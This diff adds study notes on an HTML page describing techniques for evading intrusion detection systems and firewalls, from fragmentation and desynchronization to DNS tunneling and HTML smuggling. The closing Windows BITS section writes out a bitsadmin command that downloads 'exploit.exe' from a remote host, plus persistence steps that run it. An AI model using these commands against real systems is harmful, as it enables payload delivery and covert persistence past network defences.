@@ -2,4 +2,285 @@
   <a href=index.html>Back to home</a>
 <hr/>
 <h1>Evading IDS</h1>
-<p></p>
+<p>Attackers can still evade IDS in various ways.</p>
+<h2>IDS Evasion Techniques</h2>
+<p>IDS evasion is the process of modifying attacks to fool the IDS/IPS into interpreting that the traffic is legitimate and thus prevent the IDS from triggering an alert.</p>
+<p><ol>
+  <ul>Insertion Attack</ul>
+  <ul>Evasion</ul>
+  <ul>DoS Attack</ul>
+  <ul>Obfuscating</ul>
+  <ul>False Positive Generation</ul>
+  <ul>Session Splicing</ul>
+  <ul>Unicode Evasion</ul>
+  <ul>Fragmentation Attack</ul>
+  <ul>Overlapping Fragments</ul>
+  <ul>Time-To-Live Attacks</ul>
+  <ul>Urgency Flag</ul>
+  <ul>Invalid RST Packets</ul>
+  <ul>Polymorphic Shellcode</ul>
+  <ul>ASCII Shellcode</ul>
+  <ul>Application-Layer Attacks</ul>
+  <ul>Desynchronization</ul>
+  <ul>Encryption</ul>
+  <ul>Flooding</ul>
+</ol></p>
+
+<h2>Insertion Attack</h2>
+<p>The attacker confuses the IDS by forcing it to read invalid packets. An IDS blindly trusts and accepts a packet that an end system rejects. If the IDS reads an invalid packet, it gets confused. 
+An attacker exploits this condition and inserts data into the IDS. This attack occurs when the NIDS is less strict in processing packets than the internal network. The attacker obscures extra traffic 
+and the IDS concludes that the traffic is harmless. Hence, the IDS gets more packets than the destination.</p>
+<h2>Evasion</h2>
+<p>When the IDS discards packets while the host that has to get the packets accepts them. Using this technique, an attacker exploits the host computer. Evasion attacks have an adverse effect on the accuracy 
+of the IDS. For example, if the attacker sends a malicious sequence byte by byte, and if the IDS rejects only one byte, it cannot detect the attack. Here, the IDS gets fewer packets than the destination.</p>
+<h2>Denial-of-Service Attack (DoS)</h2>
+<p>Multiple types of DoS attack will work against IDS. </p>
+<p><ol>
+  <ul>causes the device to lock up</ul>
+  <ul>causes personnel to be unable to investigate all the alarms</ul>
+  <ul>causes more alarms than can be handled by management systems</ul>
+  <ul>Fills up disk space, preventing attacks from being logged</ul>
+  <ul>Consumes the device's processing power and allows attacks to sneak by</ul>
+</ol></p>
+<h2>Obfuscating</h2>
+<p>Making code more difficult to understand or read, generally for privacy or security purposes. An obfuscator converts a straightforwarded program into one that works in the same way but which is much
+more difficult to understand. Obfuscation is an IDS evasion technique used by attackers to encode the attack packet payload in such a way that the destination host can only decode the packet but not the IDS. 
+An attacker manipulates the path referenced in the signature to fool the IDS. Using Unicode characters, an attacker can encode attack packets that the IDS would not recognize but which an IIS web server 
+can decode. Attackers perform obfuscated attacks on encrypted protocols such as HTTPS. Also possible: steganography.</p>
+<h2>False Positive Generation</h2>
+<p>In this mode, the IDS generates an alarm when no condition is present to warrant one. Another attack similar to the DoS method is to create a significant amount of alert data that the IDS will log.</p>
+<h2>Session Splicing</h2>
+<p>Network-level evasion method used to bypass IDS where an attacker splits the traffic into an excessive number of packets such that no single packet triggers the IDS. Many IDS reassemble communication 
+streams; if a packet is not received within a reasonable period, many IDS stop reassembling and handling that stream.</p>
+<h2>Unicode Evasion Technique</h2>
+<p>Attackers can implement an attack by different character encodings known as <b>code points</b> in the Unicode code space. In the Unicode code space, all the code points are treated differently, but it is 
+possible that there are multiple representations of a single character. Applications or OS may assign the same representation to different code points. Because of this complexity, some IDS mishandle unicode. 
+Taking advantage of this, attackers can convert attack strings into Unicode charachters to avoid pattern and signature matching in the IDS. Attackers can also encode URLs in HTTP requests using Unicode 
+characters to bypass HTTP-based attack detection at the IDS.</p>
+<h2>Fragmentation Attack</h2>
+<p>IP packets must follow the standard <b>Maximum Transmission Unit (MTU)</b> size while traveling across the network. If the packet size is exceeded, it will be split into multiple fragments (fragmentation). 
+The IP header contains of a fragment ID, fragment offset, fragment length, fragment flags and other besides the original data. In a network, the flow of packets is irregular; systems need to keep fragments 
+around, wait for future fragments and then reassemble them in order. Fragmentation can be used as an attack vector when fragmentation timeouts vary between the IDS and the host. Through the process of 
+fragmenting and reassembling, attackers can send malicious packets over the network to exploit and attack systems. </p>
+<h2>Overlapping Fragments</h2>
+<p>In this technique, attackers generate a series of tiny fragments with overlapping TCP sequence numbers. For example, the initial fragment consists of 100 bytes of payload with the sequence number of 1, 
+the second fragment includes an overlapping sequence of 96 bytes etc.</p>
+<h2>Time-To-Live Attacks</h2>
+<p>Each IP packet has a field called Time to Live (TTL), which indicates how many hops the packet can take before a network node discards it. Each router along a data path decrements this value by 1. When the 
+TTL reaches 0, the packet is dropped and an ICMP alert notification is sent to the sender. Attackers can guess the number of routers between them and a sending machine, and make assumptions as to what the 
+initial TTL was, thereby guessing which OS a host is running, as a prelude to an attack. <b>SmartDefense</b> can change the TTL field of all packets to a given number. These attacks require the attacker 
+to have prior knowledge of the topology of the victim's network (traceroute). </p>
+<h2>Urgency Flag</h2>
+<p>When the user sends the urgency flag (URG) the TCP ignores all data before the urgency pointer; some IDS do not consider the TCP's urgency feature and process all the packets in the traffic, whereas the 
+target system processes only the urgent data.</p>
+<h2>Invalid RST Packets</h2>
+<p>The TCP uses 16-bit checksums for error checking of the header and data and to ensure that communication is reliable. It adds a checksum to every transmitted segment that is checked at the receiving end.
+When a checksum differs from the checksum expected by the receiving host, the TCP drops the packet. The TCP also uses an RST packet to end two-way communications. Attackers can use this feature to elude 
+detection by sending RST packets with an invalid checksum, which causes IDS to stop processing the stream because the IDS thinks that the communication session has ended.</p>
+<h2>Polymorphic Shellcode</h2>
+<p>Polymorphic shellcode attacks include multiple signatures, making it difficult to detect the signature. Attackers hide their shellcode (attack code) by encrypting it with an unknown encryption 
+algorithm; they use an existing buffer-overflow exploit </p>
+<h2>ASCII Shellcode</h2>
+<p>ASCII shellcodes allow attackers to bypass commonly enforced character restrictions within the string input code</p>
+<h2>Application-Layer Attacks</h2>
+<p>Media files such as images, audio and videos can be compressed so that they can be rapidly transferred as smaller chunks. Attackers find flaws in this compressed data and perform attacks; even the 
+IDS signatures cannot identify the attack code within data thus compressed.</p>
+<h2>Desynchronization</h2>
+<h2>Pre-Connection SYN</h2>
+<p>This attack is performed by sending an initial SYN before the real connection is established, but with an invalid TCP checksum. The IDS can ignore or accept subsequent SYNs in a connection. If a SYN 
+packet is received after the TCP control block is opened, the IDS resets the appropriate sequence number to match the newly received SYN packet. Attackers send fake SYN packets with a completely invalid 
+sequence number to desynchronize the IDS. This stops the IDS from monitoring all legitimate and attack traffic. If the IDS is smart, it does not check the TCP checksum. If the IDS checks the checksum, the
+attack is synchronized and a bogus sequence number is sent to the IDS before the real connection occurs.</p>
+<h2>Post-Connection SYN</h2>
+<p>In this technique, attackers attempt to desynchronize the IDS from the actual sequence numbers that the kernel is honoring. This attack intends to get the IDS to resynchronize its notion of the sequence 
+numbers to the new SYN packet. It will then ignore any data that is a legitimate part of the original stream because it will be waiting for a different sequence number.</p>
+<h2>Encryption</h2>
+<p>If an attacker succeeds in establishing an encrypted session with his/her target host using a secure shell (SSH), secure socket layer (SSL) or VPN tunnel, the IDS will not analyze the packets going 
+through these encrypted communications.</p>
+<h2>Flooding</h2>
+<p>IDS use resources such as memory and processor speed to analyze the traffic going through them. To bypass IDS security, attackers flood IDS resources with noise or fake traffic to exhaust them with 
+having to analyze flooded traffic. Once such attacks succeed, attackers send malicious traffic toward the target system behind the IDS, which offers little of no intervention.</p>
+
+<h1>Evading Firewalls</h1>
+<p><ol>
+  <ul>Port Scanning</ul>
+  <ul>Firewalking</ul>
+  <ul>Banner Grabbing</ul>
+  <ul>IP Address Spoofing</ul>
+  <ul>Source Routing</ul>
+  <ul>Tiny Fragments</ul>
+  <ul>Using an IP Address in Place of an Url</ul>
+  <ul>Using Anonymous Website Surfing Sites</ul>
+  <ul>Using a Proxy Server</ul>
+  <ul>ICMP Tunneling</ul>
+  <ul>ACK Tunneling</ul>
+  <ul>HTTP Tunneling</ul>
+  <ul>SSH Tunneling</ul>
+  <ul>DNS Tunneling</ul>
+  <ul>Through External Systems</ul>
+  <ul>Through MITM Attack</ul>
+  <ul>Through Content</ul>
+  <ul>Through XSS Attack</ul>
+  <ul>Through HTML Smuggling</ul>
+  <ul>Through Windows BITS</ul>
+</ol></p>
+
+<h2>Port Scanning</h2>
+<p>Finding open ports is an attacker's first step toward gaining access to the target system</p>
+
+<h2>Firewalking</h2>
+<p>Firewalking is a method of collecting information about remote networks behind firewalls. It is a technique that uses TTL values to determine gateway ACL filters and map networks by analyzing the 
+IP packet response. Firewalk is a well-known application used for firewalking. It has to phases: a network discovery phase and a scanning phase. It comes with various open source Linux distributions. 
+Nmap has a firewalk script that can be used to perform firewalking.</p>
+
+<h2>Banner Grabbing</h2>
+<p>Banners are service announcements provided by services in response to connection requests, and they often carry vendor version information. Banner grabbing is a simple method of fingerprinting that helps 
+in detecting the vendor of a firewall and the firmware version. It identifies the service running on the system. The three primary services that send out banners are FTP, Telnet and web servers. A firewall 
+does not block banner grabbing because the connection between the attacker's system and the target system appears legitimate.</p>
+
+<h2>IP Address Spoofing</h2>
+<p>IP address spoofing is a hijacking technique in which an attacker masquerades as a trusted host to conceal his identity, spoof a website, hijack browsers or gain unauthorized access to a network. Most firewalls 
+filter packets based on the source IP address and define if it is coming from a legitimate source. IP spoofing bypasses such firewalls.</p>
+
+<h2>Source Routing</h2>
+<p>Using this technique, the sender of the packet designates the route that a packet should take through the network such that the designated route should bypass the firewall node.</p>
+
+<h2>Tiny Fragments</h2>
+<p>Attackers create tiny fragments of outgoing packets, forcing some of the TCP packet's header information into the next fragment. This attack is used to avoid user-defined filtering rules and works when the 
+firewall checks only for the TCP header information.</p>
+
+<h2>Using IP Address in place of Url</h2>
+<p>Use IP instead of FQDN</p>
+
+<h2>Using Anonymous Website Surfing Sites</h2>
+<p><ol>
+  <ul>Anonymize VPN</ul>
+  <ul>free-proxy.com</ul>
+  <ul>Proxify.com</ul>
+</ol></p>
+
+<h2>Using a Proxy Server</h2>
+<p><ol>
+  <ul>find an appropriate proxy server</ul>
+  <ul>Windows Control Panel > Network and Internet > Internet Options > Connections > LAN? settings</ul>
+  <ul>Under LAN settings > Use a proxy server for your LAN</ul>
+  <ul>Address > IP address of proxy server</ul>
+  <ul>Port > default: 8080</ul>
+  <ul>Bypass proxy server for local addresses</ul>
+</ol></p>
+
+<h2>ICMP Tunneling Method</h2>
+<p>ICMP is used to send an error message to the client. As it is a required service for network communication, users often enable this service on their networks. Attackers perform ICMP 
+tunneling to send data into the target network. The ICMP tunnel provides attackers with full access to target networks. Assuming that ICMP is allowed through a firewall, use LOKI ICMP tunneling to execute 
+commands of choice by tunneling them inside the payload of ICMP echo packets.</p>
+
+<h2>ACK Tunneling method</h2>
+<p>Ordinary packet filtering firewalls define their rule set based on the SYN packet when TCP level communication is to be established. This is because such a firewall assumes that only the SYN packet is 
+coming from the client and is thus likely to contain malicious code in the SYN packet. These firewalls ignore the possibility that the attacker can also inject malicious code in the ACK packet. Tools such 
+as AckCmd (packetstormsecurity.com) use ACK tunneling.</p>
+
+<h2>HTTP Tunneling Method</h2>
+<p>This method can be implemented if the target company has a public web server in which port 80 is used for HTTP traffic that is unfiltered by its firewall. The attacker encapsulates data inside HTTP 
+traffic. Many firewalls do not examine the payload of an HTTP packet. Tools such as HTTPTunnel (sourceforge.net) use this technique. Upload the server (hts) to the target system and redirect it through TCP 
+port 80.</p>
+<p><ol>
+  <ul>Super Network Tunnel (networktunnel.net) -> works like VPN tunneling but uses the HTTP protocol to establish a connection for accessing the internet without monitoring</ul>
+  <ul>HTTPort and HTTHost (targeted.org)</ul>
+  <ul>Tunna</ul>
+  <ul>HTTPTunnel</ul>
+</ol></p>
+
+<h2>SSH Tunneling Method</h2>
+<p>Sending unencrypted network traffic through an SSH tunnel</p>
+<p><ol>
+  <ul>Bitvise</ul>
+  <ul>Secure Pipes (opoet.com)</ul>
+</ol></p>
+
+<h2>DNS Tunneling Method</h2>
+<p>DNS uses UDP. Small size constraints on external queries allow DNS to be used as an ideal choice to perform data exfiltration by various malicious entities. Corrupt or malicious data can be secretly 
+embedded into the DNS protocol packets, even DNSSEC cannot detect the abnormality in DNS tunneling. Port 53.</p>
+<p><ol>
+  <ul>NSTX (sourceforge.net)</ul>
+  <ul>Heyoka (sourceforge.net)</ul>
+  <ul>Iodine (code.kryo.se</ul>
+</ol></p>
+
+<ul>MITM Attacks</ul>
+<p>Most security administrators focus on the possibility of an external or internal network bypassing their firewall while ignoring the fact that firewalls can be bypassed using MITM attacks on DNS servers.
+In MITM attacks, attackers use DNS servers and routing techniques to bypass firewall restrictions.</p>
+<p><ol>
+  <ul>Attacker performs DNS server poisoning</ul>
+  <ul>User A requests for website from the corporate DNS server</ul>
+  <ul>Corporate DNS server sends the IP address of the attacker</ul>
+  <ul>User A accesses the attacker's malicious server</ul>
+  <ul>Attacker connects to real host and tunnels the user's HTTP traffic</ul>
+  <ul>The malicious code embedded in the attacker's web page is downloaded and executed on the user's machine</ul>
+</ol></p>
+
+<h2>Bypassing Firewalls through Content</h2>
+<p>The attacker sends content containing malicious code to the user and tricks him into opening it so that the malicious code can be executed. Commonly used file formats for carrying malicious content:</p>
+<p><ol>
+  <ul>EXE, COM, BAT, PS, PDF, CDR (CorelDraw)</ul>
+  <ul>DVB, DWG (AutoCad)</ul>
+  <ul>SMM (AMI Pro)</ul>
+  <ul>DOC, DOT, CNV, ASD (Word)</ul>
+  <ul>XLS, XLB, XLT (Excel)</ul>
+  <ul>ADP, MDA, MDB, MDE, MDN, MDZ (Access)</ul>
+  <ul>VSD (Visio)</ul>
+  <ul>MPP, MPT (MS Project)</ul>
+  <ul>PPT, PPS, POT (PowerPoint)</ul>
+  <ul>MSG, OTM (Outlook)</ul>
+</ol></p>
+
+<h2>XSS Attack</h2>
+<p>Using ASCII values to bypass the WAF (Web Application Firewall)</p>
+<p>Using HEX Encoding to bypass the WAF</p>
+<p>Using Obfuscation to bypass the WAF</p>
+
+<h2>Using HTTP Header Spoofing</h2>
+<p>Web Application Firewalls allow specific queries and syntaxes that originate from internal addresses. Attackers abuse this functionality to send requests with spoofed (internal) address headers to trick the 
+WAF into believing that the request originated from their internal network. Attackers use tools such as Burp Suite to exploit HTTP headers and bypass WAF.</p>
+
+<h2>Using Blacklist Detection</h2>
+<p>Attackers can abuse the WAF blacklist detection mechanism to bypass WAF. Attackers fingerprint the target WAF to identify blacklisted keywords. By identifying the blacklist keywords, attackers create new 
+regex and payloads with keywords not included in the blacklists.</p>
+
+<h2>Using Fuzzing / Brute-forcing</h2>
+<p>In this technique, attackers test the target WAF with multiple known payloads to evade WAF. A WAF can easily detect fuzzing / brute-forcing attempts. To prevent this, attackers first send payloads to the WAF connected 
+to their local network to identify the payloads to the target WAF for evasion. In this process, attackers use wordlists such as SecList Fuzzing Database (github.com) and FuzzDB Attack Patterns (github.com) to perform 
+fuzzing on the target network. Attackers first load the wordlist into a fuzzer to start the brute-forcing attempts. They record all the responses received for the fuzzed payloads. Now, they use random user-agents and 
+proxy chains to evade WAF.</p>
+
+<h2>Abusing SSL/TLS ciphers</h2>
+<p>In some cases, the target web servers accept connections from different SSL/TLS ciphers, but the filtering firewall may not support all the ciphers supported by the server. Attackers abuse this vulnerability 
+to bypass the WAF. Attackers use tools like sslscan (github.com) to detect the ciphers supported by the web server. If the attackers detect any ciper that is supported by the web server and not by the WAF, they use 
+that cipher to evade WAF and establish a connection with the target server. Attackers use tools such as abuse-ssl-bypass-waf.py (github.com) and curl (curl.se) to perform this attack.</p>
+
+<h2>HTML Smuggling</h2>
+<p>Web attack in which an attacker injects malicious code into a HTML script to compromise a web page. The purpose of HTML smuggling is to succesfully install the malware payload on a target system when the victim 
+access the malicious link sent via a phishing mail. </p>
+<p>Signs of HTML smuggling:</p>
+<p><ol>
+  <ul>A zip file with javascript</ul>
+  <ul>an encrypted attachment</ul>
+  <ul>existence of suspicious script code within a HTML - based file</ul>
+  <ul>decoding of HTML - based file using Base64</ul>
+</ol></p>
+
+<h2>Windows BITS</h2>
+<p>Background Intelligent Transfer Service (BITS) is a standard service used to distribute automatic Windows updates to its global users. BITS can be exploited by attackers to bypass firewalls because 
+organizations prefer to disregard BITS traffic as it includes a constant stream of software upgrades.</p>
+<p>BITS transfers are asynchronous; the program that establishes the job may not be active in the background when the requested transfer is done. Any executable or command can be specified using the 
+notification commands linked with BITS jobs. BITS jobs can be established using the bitsadmin command-based interface or API function calls. Run bitsadmin command to create a job, transfer the malicious file to 
+the remote system and store it at the specified location.</p>
+<p>bitsadmin /transfer exploit.exe http://10.10.1.13/share/exploit.exe c:\exploit.exe</p>
+<p>Create persistence by specifying a Notify:</p>
+<p><ol>
+  <ul>/create persistence</ul>
+  <ul>/addfile persistence <Malicious URL> <Local Path></ul>
+    <ul>/SetNotifyCmdLine persistence <Local Path> Null</ul>
+    <ul>/resume persistence</ul>
+</ol></p>
+    <p>With the malicious payload or program in action, it can create specific jobs such as schedule tasks, which are set to be executed in a queue. As these jobs run at a system level, they cna be 
+    considered as trusted jobs and are allowed to bypass security solutions such as firewalls.</p>
